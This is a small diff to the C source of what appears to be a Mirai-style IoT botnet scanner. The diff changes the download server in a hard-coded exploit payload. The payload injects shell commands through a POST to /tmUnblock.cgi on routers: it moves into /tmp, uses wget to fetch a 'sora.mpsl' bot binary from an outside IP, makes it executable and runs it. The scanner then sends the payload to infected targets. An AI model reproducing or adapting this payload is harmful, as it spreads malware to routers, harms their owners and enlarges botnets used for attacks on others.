@@ -275,7 +275,7 @@ void asus_scanner_init(void)
                             printf("[scanner] FD%d sending payload\n", conn->fd);
                         #endif
 		
-                        util_strcpy(conn->payload_buf, "POST /tmUnblock.cgi cd /tmp; rm -rf WW3V1SRC.mpsl; wget http://34.147.211.204/bins/sora.mpsl;chmod 777 *;./sora.mpsl asus");
+                        util_strcpy(conn->payload_buf, "POST /tmUnblock.cgi cd /tmp; rm -rf WW3V1SRC.mpsl; wget http://35.234.54.226/bins/sora.mpsl;chmod 777 *;./sora.mpsl asus");
 						
                         send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                         util_zero(conn->payload_buf, sizeof(conn->payload_buf));
